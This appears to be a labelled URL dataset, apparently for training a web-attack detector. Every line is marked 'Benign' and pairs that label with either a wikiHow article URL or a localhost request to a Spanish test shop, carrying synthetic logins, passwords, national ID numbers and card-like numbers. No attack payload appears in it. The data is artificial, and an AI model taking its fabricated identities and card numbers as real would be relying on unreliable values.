http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=friedl&password=lipis&nombre=pe%f1imel&apellidos=basc%f3n+egea&email=vanel-ricotta%40estoespresto.sy&dni=81192846v&direccion=serrano+19%2c+&ciudad=cubillo+de+uceda%2c+el&cp=03720&provincia=burgos&ntc=6214995604672361&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nataraja&password=d4upa&nombre=zoraida&apellidos=heras+del+moral&email=lowry-carmine%40filtraciondehumos.nc&dni=69549902h&direccion=c%2f+albercuix%2c+27%2c+&ciudad=%c1greda&cp=50369&provincia=ourense&ntc=0017018534732457&b1=registrar,Benign
http://www.wikihow.com/be-able-to-create-a-story&t=1396527627529&n=840565&k=mainentity,Benign
http://www.wikihow.com/crash-windows-xp-by-batch-programming&t=1396531840248&n=1038766&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9605&b1=pasar+por+caja,Benign
http://www.wikihow.com/delete-a-book-or-pdf-in-ibooks&t=1396527829959&n=849157&k=mainentity,Benign
http://www.wikihow.com/destroy-a-nebula-monument-in-avicus&t=1396648467303&n=5967439&k=mainentity,Benign
http://www.wikihow.com/block-an-application-or-.exe-from-running-in-windows&t=1396611060168&n=4742305&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=svilans&pwd=alcatifero&remember=on&b1=entrar,Benign
http://www.wikihow.com/keep-the-ground-dry-beneath-a-garden-tap&t=1396563754177&n=2633010&k=mainentity,Benign
http://www.wikihow.com/make-an-angel-pie&t=1396515798916&n=216001&k=mainentity,Benign
http://www.wikihow.com/honor-your-party-guests&t=1396546888552&n=1730556&k=mainentity,Benign
http://www.wikihow.com/be-pretty-on-animal-jam-(non-member-girls)&t=1396648230844&n=5956999&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9396&b1=pasar+por+caja,Benign
http://www.wikihow.com/practice-and-memorize-prayers-for-your-bar-or-bat-mitzvah&t=1396569667271&n=2914553&k=mainentity,Benign
http://www.wikihow.com/make-an-avatar-on-tektek.org&t=1396630301078&n=5452313&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=5&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/be-a-more-romantic-lover&t=1396571016626&n=2971277&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4840&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shearman&pwd=pid%e9n&remember=on&b1=entrar,Benign
http://www.wikihow.com/make-pickled-crabapples&t=1396517524720&n=321179&k=mainentity,Benign
http://www.wikihow.com/imitate-fred-fredburger-from-the-grim-adventures-of-billy-and-mandy&t=1396528241117&n=869437&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lanctot&pwd=240m%edfe9o&remember=on&b1=entrar,Benign
http://www.wikihow.com/be-really-boring-(for-school-play)&t=1396528057106&n=860305&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yu-kai&password=n5peri3no&nombre=regulo&apellidos=biffi+gilart&email=lamargue%40blogsmegumi.cs&dni=38859212e&direccion=poligono+los+palancares%2c+198%2c+2-a&ciudad=juneda&cp=50513&provincia=burgos&ntc=8993369761745604&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=82&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/contact-youtube&t=1396630112572&n=5446721&k=mainentity,Benign
http://www.wikihow.com/choose-outfits-for-a-casual-lifestyle&t=1396517926265&n=351474&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=44&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/decode-computer-jargon&t=1396531766808&n=1034590&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=holmer&password=cuatra%f1al&nombre=valencio&apellidos=adaros&email=briguad%40bru%f1oseguridad.me&dni=82617066p&direccion=higueras+118%2c+11-f&ciudad=gilet&cp=17464&provincia=santa+cruz+de+tenerife&ntc=9493849215723588&b1=registrar,Benign
http://www.wikihow.com/walk-in-heels-looking-comfortably-gorgeous-everywhere&t=1396518003415&n=353610&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=abdalla&password=caluyo&nombre=celedonia&apellidos=bes+novalbos&email=smithson%40esmarbella.cu&dni=02875410l&direccion=calle+leoncio+rodriguez%2c+25+10%3fc&ciudad=olmedilla+de+eliz&cp=21240&provincia=almer%eda&ntc=0500121668297031&b1=registrar,Benign
http://www.wikihow.com/become-a-psychic-investigator&t=1396569719614&n=2916909&k=mainentity,Benign
http://www.wikihow.com/make-blackened-cajun-halibut&t=1396547304236&n=1761444&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=caria&pwd=egipciaca&remember=off&b1=entrar,Benign
http://www.wikihow.com/keep-strawberries-fresh&t=1396545965124&n=1671536&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=snowden&password=in843ct43827e&nombre=artaldo&apellidos=alou&email=lillie%40canovash.ro&dni=28186397n&direccion=alqueria+de+cachondo+143%2c+4%3fh&ciudad=pola+de+gord%f3n%2c+la&cp=46669&provincia=valencia&ntc=0797657649779918&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=philippe&pwd=ceba%24do&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-your-hair-wavy-with-no-heat&t=1396593168298&n=3871900&k=mainentity,Benign
http://www.wikihow.com/organize-a-classroom-library&t=1396527739066&n=845233&k=mainentity,Benign
http://www.wikihow.com/prevent-damage-to-dc-power-jack-on-your-laptop&t=1396532644997&n=1073744&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=freddy&password=e1quis24e2&nombre=eros&apellidos=bellavista+puigdomenech&email=schnell.briguet%40eco-pro.mp&dni=51920905s&direccion=plazuela+cimadevilla+73%2c+&ciudad=casas+del+monte&cp=37892&provincia=barcelona&ntc=3784454215499984&b1=registrar,Benign
http://www.wikihow.com/choose-a-garage-foundation&t=1396563663315&n=2627686&k=mainentity,Benign
http://www.wikihow.com/budget-college-tuition-and-loans-using-excel&t=1396613809484&n=4829559&k=mainentity,Benign
http://www.wikihow.com/maintain-a-rooftop-deck&t=1396563521604&n=2618398&k=mainentity,Benign
http://www.wikihow.com/maintain-your-own-real-life-warrior-clan&t=1396633419386&n=5527785&k=mainentity,Benign
http://www.wikihow.com/protect-your-mattress-from-your-pets&t=1396563299592&n=2603916&k=mainentity,Benign
http://www.wikihow.com/draw-a-violin&t=1396610259806&n=4705130&k=mainentity,Benign
http://www.wikihow.com/create-a-one-direction-fan-poster&t=1396527568492&n=838261&k=mainentity,Benign
http://www.wikihow.com/design-your-new-bedroom&t=1396562212120&n=2534504&k=mainentity,Benign
http://www.wikihow.com/calculate-the-cost-of-debt&t=1396613146654&n=4807619&k=mainentity,Benign
http://www.wikihow.com/migrate-from-mybb-to-vbulletin-with-cms2cms&t=1396532317116&n=1059906&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3167&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-bagel-bite-delights&t=1396546691157&n=1719588&k=mainentity,Benign
http://www.wikihow.com/find-out-who-your-bff-fancies&t=1396569944410&n=2927173&k=mainentity,Benign
http://www.wikihow.com/find-all-triple-digit-narcissistic-numbers-with-esproc&t=1396534033641&n=1140261&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=76&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/el-dorado-furniture-plans&t=1396562724293&n=2568228&k=mainentity,Benign
http://www.wikihow.com/be-rich-on-animal-jam&t=1396648233625&n=5957115&k=mainentity,Benign
http://www.wikihow.com/make-boursin-style-cream-cheese&t=1396547139465&n=1743264&k=mainentity,Benign
http://www.wikihow.com/bypass/crack-a-bios-password&t=1396526673583&n=795238&k=mainentity,Benign
http://www.wikihow.com/create-a-garden-of-fragrant-australian-plants&t=1396561926190&n=2518044&k=mainentity,Benign
http://www.wikihow.com/be-stoic-like-epictetus&t=1396569900681&n=2925369&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hon-son&password=ta10ri3%c14e5&nombre=hans&apellidos=garola+posilio&email=radico%40audiosat.au&dni=50383140f&direccion=calle+meson+de+morella+15%2c+5%3fa&ciudad=valle+de+cerrato&cp=47840&provincia=guadalajara&ntc=6265705598161273&b1=registrar,Benign
http://www.wikihow.com/have-great-winter-dates&t=1396570807059&n=2962053&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=36&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=asistore&password=vicegere%21nte&nombre=ulises&apellidos=vertizblanco&email=santess%40rtce.mo&dni=96398598d&direccion=plaza+plazuela+s%2fn%2c+&ciudad=milagros&cp=05151&provincia=%c1vila&ntc=0118236388310802&b1=registrar,Benign
http://www.wikihow.com/use-gloodle-to-create-a-mask&t=1396630310088&n=5452449&k=mainentity,Benign
http://www.wikihow.com/make-the-most-of-disney-world-on-a-budget&t=1396527983958&n=856209&k=mainentity,Benign
http://www.wikihow.com/create-a-wishlist-on-airbnb&t=1396629424288&n=5418749&k=mainentity,Benign
http://www.wikihow.com/make-a-guitar-amp-radio&t=1396534393032&n=1158517&k=mainentity,Benign
http://www.wikihow.com/add-custom-headers-to-a-justin.tv-channel&t=1396630036771&n=5443529&k=mainentity,Benign
http://www.wikihow.com/improve-employee-morale-in-nursing-homes&t=1396612595666&n=4789983&k=mainentity,Benign
http://www.wikihow.com/avoid-the-cursor-not-rendering-when-using-debian-linux-with-a-legacy-nvidia-video-card&t=1396533091887&n=1097700&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ayn&pwd=robo&remember=on&b1=entrar,Benign
http://www.wikihow.com/check-compatibility-for-life-partner&t=1396571045687&n=2972573&k=mainentity,Benign
http://www.wikihow.com/view-or-delete-facebook-search-history&t=1396631917267&n=5492140&k=mainentity,Benign
http://www.wikihow.com/pack-a-lunch-box-to-ensure-high-energy-levels&t=1396545900118&n=1668524&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=amelina&password=du911za&nombre=azrael&apellidos=terricabra+corbal&email=gianini.trushin%40biogasworld.cz&dni=68140659p&direccion=calle+pintura%2c+27+1-f&ciudad=albalatillo&cp=04531&provincia=teruel&ntc=8914897432837758&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=43&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=366&b1=pasar+por+caja,Benign
http://www.wikihow.com/check-in-at-disney%e2%80%99s-contemporary-resorts&t=1396527959537&n=855065&k=mainentity,Benign
http://www.wikihow.com/install-eclipse-and-setup-adt&t=1396533705876&n=1125961&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brovont&password=acristianar&nombre=solita&apellidos=garrote&email=gilchrist%40francislucille.tt&dni=39696226c&direccion=calle+brasil%2c+192%2c+&ciudad=garcibuey&cp=16708&provincia=guadalajara&ntc=9372683635367680&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6030&b1=confirmar,Benign
http://www.wikihow.com/beat-dry-skin-naturally&t=1396593935476&n=3914884&k=mainentity,Benign
http://www.wikihow.com/get-rare-on-animal-jam&t=1396648278808&n=5959235&k=mainentity,Benign
http://www.wikihow.com/see-if-he%27s-into-you&t=1396611864887&n=4766090&k=mainentity,Benign
http://www.wikihow.com/make-your-own-liquid-shampoo&t=1396593483968&n=3890440&k=mainentity,Benign
http://www.wikihow.com/get-the-rarest-fish-on-fish-tycoon&t=1396648758046&n=5981163&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=548&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=natalie&password=c21i04&nombre=juanmar%eda&apellidos=payas+credid%edo&email=jerome%40nutrimama.sb&dni=22975080n&direccion=travesia+bazan%2c+s%2fn%2c+4-h&ciudad=santib%e1%f1ez+el+alto&cp=25442&provincia=girona&ntc=4325308116770728&b1=registrar,Benign
http://www.wikihow.com/make-beer-muffins&t=1396595189484&n=3979867&k=mainentity,Benign
http://www.wikihow.com/choose-the-right-led-flashlight&t=1396631024134&n=5470181&k=mainentity,Benign
http://www.wikihow.com/be-cool-on-poptropica-(girls)&t=1396647967779&n=5945123&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jaekoo&password=cuadradura&nombre=idalina&apellidos=tor&email=wackerhagen%40academiaversal.cat&dni=75996092k&direccion=avda.+andalucia%2c+94+9%3fh&ciudad=art%e9s&cp=24450&provincia=%c1vila&ntc=0685161666311883&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=quang-tr&password=t19n8f78a&nombre=f%e1tima&apellidos=bargu%e9s+poller&email=labourier%40gaudio.sh&dni=11939364h&direccion=calle+pe%f1a+de+los+cuatro+jueces+190+&ciudad=mezquita+de+jarque&cp=37510&provincia=lugo&ntc=7959619280022009&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=murphy-k&pwd=2st37pa56sa&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-diorama-of-a-forest-with-a-sea-near-it&t=1396516940840&n=279961&k=mainentity,Benign
http://www.wikihow.com/replace-a-sofa-cushion&t=1396563401316&n=2608872&k=mainentity,Benign
http://www.wikihow.com/act-like-a-skyclan-cat-(warrior)&t=1396633380553&n=5526577&k=mainentity,Benign
"http://www.wikihow.com/pray-for-your-livelihood,-leaders,-wisdom,-governments-and-such-(christianity)&t=1396569671776&n=2914725&k=mainentity",Benign
http://www.wikihow.com/make-shiny-dog-oil-supplement&t=1396632319035&n=5500662&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sedat&password=medrar&nombre=matco&apellidos=agudelo+surumay&email=berge.tarbes1%40sexcarba.tm&dni=68561214p&direccion=c%2f+morales+contreras+77+6%3fb&ciudad=nava+de+ar%e9valo&cp=46418&provincia=ciudad+real&ntc=1385122948086487&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9704&b1=pasar+por+caja,Benign
http://www.wikihow.com/decide-standard-media-filling-ratio-for-a-ball-mill&t=1396563472179&n=2614394&k=mainentity,Benign
http://www.wikihow.com/make-angel-hair&t=1396515725547&n=209973&k=mainentity,Benign
http://www.wikihow.com/perform-partial-or-full-format-on-windows-7&t=1396611039467&n=4741209&k=mainentity,Benign
http://www.wikihow.com/make-an-origami-chair&t=1396609581077&n=4687681&k=mainentity,Benign
http://www.wikihow.com/find-family-friendly-software&t=1396630262557&n=5451705&k=mainentity,Benign
http://www.wikihow.com/install-and-use-vice-city-multiplayer&t=1396533803063&n=1130617&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=59&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/avoid-credit-card-fees&t=1396613142177&n=4807471&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=enrique&password=l%e1rice&nombre=aurco&apellidos=prouvay+past%e9n&email=paspalis-rushmann%40pinturaultravioleta.bs&dni=75878234s&direccion=c%2f+villaescusa+81%2c+&ciudad=luisiana%2c+la&cp=16118&provincia=burgos&ntc=4256776427949890&b1=registrar,Benign
http://www.wikihow.com/create-a-volcano-in-minecraft&t=1396648462020&n=5967199&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chautems&pwd=budi4n&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tariq&pwd=anthropogenic&remember=on&b1=entrar,Benign
http://www.wikihow.com/practice-hairstyling-on-a-wig&t=1396592993691&n=3861639&k=mainentity,Benign
http://www.wikihow.com/drought-proof-your-grocery-bill&t=1396545858617&n=1666176&k=mainentity,Benign
http://www.wikihow.com/get-rid-of-permed-hair&t=1396592792638&n=3851235&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=piotto&password=frontero&nombre=ricardo&apellidos=sennacherribbo+castelan&email=roby%40webgune.by&dni=76657172n&direccion=c%2f+cabo+de+machichaco%2c+50%2c+3-a&ciudad=valdeavellano&cp=05210&provincia=navarra&ntc=0404125173062858&b1=registrar,Benign
http://www.wikihow.com/use-social-media-to-increase-customer-loyalty&t=1396533778093&n=1129597&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidad=18&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/buy-a-tankless-gas-water-heater&t=1396562775039&n=2571824&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=catlin&password=e9q4573ar&nombre=zuleika&apellidos=lavanderos+casagran&email=glynne%40digitalcorp.nc&dni=01084663y&direccion=c%2f+de+santa+ana%2c+150%2c+&ciudad=mallabia&cp=11630&provincia=segovia&ntc=8267007191632968&b1=registrar,Benign
http://www.wikihow.com/decide-where-to-deliver-your-baby&t=1396613798520&n=4829251&k=mainentity,Benign
http://www.wikihow.com/celebrate-national-boss-day&t=1396546841178&n=1728420&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lew&password=anatado&nombre=herenia&apellidos=ca%f1as+crous&email=truffaut-montevecchi%40sindualidad.bt&dni=14134942q&direccion=c%2f+cordeleross%2c+121+7a&ciudad=barbadillo+de+herreros&cp=24322&provincia=teruel&ntc=3590940446144864&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5515&b1=confirmar,Benign
http://www.wikihow.com/change-airbnb-email-settings&t=1396629417905&n=5418581&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=assistan&password=anexidad&nombre=sharon&apellidos=rossique&email=renee%40lecriture.mp&dni=77513249y&direccion=c%2f+san+benigno+22+&ciudad=torreiglesias&cp=25382&provincia=vizcaya&ntc=6959831886953131&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=64&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/date-your-neighbor&t=1396570652031&n=2956025&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=63&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/launch-dos-in-windows-7&t=1396611109977&n=4744497&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=adelle&pwd=c46t7nenc2a&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=celine&pwd=estip*e&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sutton&password=anis-ete&nombre=cielo&apellidos=bossom&email=charbonneau_fukuda%40hiperespa%f1a.cm&dni=31320343r&direccion=calle+arenal%2c+180+&ciudad=navard%fan&cp=43427&provincia=cuenca&ntc=9107258421117454&b1=registrar,Benign
http://www.wikihow.com/plan-a-romantic-three-day-weekend&t=1396570838585&n=2963305&k=mainentity,Benign
http://www.wikihow.com/follow-in-social-media&t=1396629761312&n=5432717&k=mainentity,Benign
http://www.wikihow.com/make-a-bear-heart-treat&t=1396546431652&n=1705484&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6869&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=55&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/be-popular-on-fantage&t=1396648107351&n=5951615&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dehghan&pwd=f22jenco&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-guessing-box&t=1396546938192&n=1732704&k=mainentity,Benign
http://www.wikihow.com/dress-like-nate-westen&t=1396528349077&n=876305&k=mainentity,Benign
http://www.wikihow.com/convert-ost-to-pst-tool-exchange-ost-mailbox-to-pst-in-bulk&t=1396533612077&n=1121041&k=mainentity,Benign
http://www.wikihow.com/introduce-a-new-girlfriend-to-the-kids&t=1396571198186&n=2978881&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=18&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-cuppacino-bath-bombs&t=1396593278906&n=3877976&k=mainentity,Benign
http://www.wikihow.com/make-carrot-cake-in-harvest-moon:-animal-parade&t=1396649556753&n=6008034&k=mainentity,Benign
http://www.wikihow.com/accessorize-a-child%27s-room&t=1396562012330&n=2523276&k=mainentity,Benign
http://www.wikihow.com/load-up-a-laptop-that-is-stuck&t=1396532629904&n=1073124&k=mainentity,Benign
http://www.wikihow.com/apply-green-and-pink-leopard-makeup&t=1396593807993&n=3908124&k=mainentity,Benign
http://www.wikihow.com/make-indori-poha-jalebi&t=1396526981906&n=813324&k=mainentity,Benign
http://www.wikihow.com/plan-a-successful-office-luncheon&t=1396631698587&n=5487278&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=el&password=ci1860v7l48&nombre=rhode&apellidos=orfila+ochotorrena&email=quon.occhipinti%40google-movil.bn&dni=36575335e&direccion=av.+maria+auxiliadora+121+&ciudad=monda&cp=20700&provincia=sevilla&ntc=8093934676892216&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=pierrick&pwd=p53nisferio&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-mini-bonfire-for-fun&t=1396612553175&n=4788787&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1375&b1=pasar+por+caja,Benign
http://www.wikihow.com/calm-a-timid-dog&t=1396516657023&n=265484&k=mainentity,Benign
http://www.wikihow.com/avoid-going-to-bed-with-wet-hair&t=1396592811108&n=3852091&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hao-yung&password=pis59u84&nombre=santina&apellidos=berzal+capllonc&email=angadi.frankovitch%40conac.com.so&dni=71621175a&direccion=glorieta+de+congresos%2c+100+5f&ciudad=carcedo+de+bureba&cp=28729&provincia=salamanca&ntc=2102280198560516&b1=registrar,Benign
http://www.wikihow.com/act-like-mario&t=1396528033569&n=859065&k=mainentity,Benign
http://www.wikihow.com/share-your-files-with-family-and-friends-online&t=1396532240306&n=1057134&k=mainentity,Benign
http://www.wikihow.com/recognize-an-ergonomic-desk&t=1396562761762&n=2570700&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pircher&password=s%cdn-dica&nombre=gaudencia&apellidos=aylagas+ballado&email=dor%40velazquezlarranaga.ar&dni=15099047f&direccion=machichaco%2c+38+2%3fh&ciudad=penagos&cp=01899&provincia=vizcaya&ntc=8593343598793829&b1=registrar,Benign
http://www.wikihow.com/waterproof-an-mp3-player&t=1396533451451&n=1113921&k=mainentity,Benign
http://www.wikihow.com/act-mentally-disturbed&t=1396528040602&n=859329&k=mainentity,Benign
http://www.wikihow.com/create-an-autoresponder-on-constant-contact&t=1396532521767&n=1068358&k=mainentity,Benign
http://www.wikihow.com/make-eggnog-muffins&t=1396595206333&n=3981415&k=mainentity,Benign
http://www.wikihow.com/grow-algae-in-a-pot&t=1396561898370&n=2516016&k=mainentity,Benign
http://www.wikihow.com/explore-the-world-of-harry-potter-books&t=1396633355705&n=5525493&k=mainentity,Benign
http://www.wikihow.com/add-a-column-in-tweetdeck&t=1396630000180&n=5442181&k=mainentity,Benign
http://www.wikihow.com/make-a-bonfire-with-lighter-fluid&t=1396631127620&n=5472828&k=mainentity,Benign
http://www.wikihow.com/make-a-rush-class-in-modern-warfare-3&t=1396649391085&n=6001619&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hooker&password=abiet%e1cea&nombre=gaspar&apellidos=sequeiros+rabadan&email=spellman%40eddydaniele.cx&dni=58974688c&direccion=calle+pez+volador%2c+53+&ciudad=rasueros&cp=19153&provincia=barcelona&ntc=4676721414500375&b1=registrar,Benign
http://www.wikihow.com/set-shutter%27s-preferences&t=1396611159792&n=4746437&k=mainentity,Benign
http://www.wikihow.com/convert-to-orthodox&t=1396570302441&n=2941761&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rosmunda&password=sep3&nombre=imelda&apellidos=turon+yaz%e1n&email=argibay_galabrue7%40am-si.kn&dni=30585356w&direccion=passatge+baraldes%2c+81%2c+&ciudad=berlanga+de+duero&cp=29313&provincia=segovia&ntc=2575954953952307&b1=registrar,Benign
http://www.wikihow.com/become-a-twilight-team-member&t=1396633320539&n=5524049&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aime0&password=7ia0ogi7mo&nombre=candelario&apellidos=sebastan+bastida&email=catenacci%40grupodescansoyhogar.za&dni=97387920d&direccion=calle+cordoneria%2c+46+&ciudad=p%e1jara&cp=48140&provincia=soria&ntc=9954819785404199&b1=registrar,Benign
http://www.wikihow.com/be-cool-on-moshi-monsters&t=1396648063853&n=5949839&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fiteny&password=mos*tear&nombre=bader&apellidos=carrillo+intxaurraga&email=lyney8%40intapisur.pr&dni=94153718k&direccion=calle+pellisso%2c+61%2c+&ciudad=casasimarro&cp=02250&provincia=teruel&ntc=1949707565423527&b1=registrar,Benign
http://www.wikihow.com/manually-uncover-the-pool&t=1396564002078&n=2646394&k=mainentity,Benign
http://www.wikihow.com/do-a-super-fun-facial-two-different-ways&t=1396593371955&n=3883336&k=mainentity,Benign
http://www.wikihow.com/be-a-part-of-a-fandom&t=1396527553945&n=837613&k=mainentity,Benign
http://www.wikihow.com/act-like-laura-from-little-house-on-the-prairie&t=1396528031932&n=859009&k=mainentity,Benign
http://www.wikihow.com/add-google-adsense-to-feedburner&t=1396629371261&n=5416845&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2931&b1=confirmar,Benign
http://www.wikihow.com/avoid-seeing-hate-on-your-favourite-band&t=1396633104187&n=5518194&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=1&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=oyung&password=3u37so&nombre=zain&apellidos=miquel+palop&email=baroux%40autoescuelavilla.gob&dni=18861705a&direccion=c%2f+marcial%2c+117%2c+4%3fg&ciudad=aldehuela+de+jerte&cp=30710&provincia=teruel&ntc=0646726821565052&b1=registrar,Benign
http://www.wikihow.com/quieten-water-pipes&t=1396562968169&n=2585024&k=mainentity,Benign
http://www.wikihow.com/boost-on-call-of-duty:-modern-warfare-3&t=1396649387679&n=6001519&k=mainentity,Benign
http://www.wikihow.com/make-a-tennessee-walking-horse-do-the-running-walk&t=1396526847989&n=804152&k=mainentity,Benign
http://www.wikihow.com/make-health-juices&t=1396545660092&n=1653748&k=mainentity,Benign
http://www.wikihow.com/dye-your-hair-purple-like-holly-from-geordie-shore&t=1396516566188&n=260850&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=stutts&password=9%24u65la1he&nombre=crispino&apellidos=casellas&email=langston%40zoorapia.bv&dni=27978102m&direccion=doctor+juan+barbudo+ortiz+102%2c+10-e&ciudad=xeresa&cp=03130&provincia=almer%eda&ntc=0837757133124277&b1=registrar,Benign
http://www.wikihow.com/use-storage-spaces-for-windows-8&t=1396611491477&n=4754749&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ghartey&pwd=des%3fabridamente&remember=off&b1=entrar,Benign
http://www.wikihow.com/manage-cable-installation-projects&t=1396532124874&n=1051914&k=mainentity,Benign
http://www.wikihow.com/switch-your-reddit-language&t=1396629657885&n=5428245&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=19&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/host-an-nhl-playoff-tailgate-party&t=1396546822428&n=1727476&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alleen&password=sobrecr*uz&nombre=jordana&apellidos=mendivil+bellv%e9&email=hobes2%40eyewear.nom.rs&dni=55570540x&direccion=c%2f+occidente+s%2fn%2c+&ciudad=montoliu+de+lleida&cp=37834&provincia=a+coru%f1a&ntc=6771205694691894&b1=registrar,Benign
http://www.wikihow.com/feel-happy-and-not-be-depressed&t=1396516263263&n=244678&k=mainentity,Benign
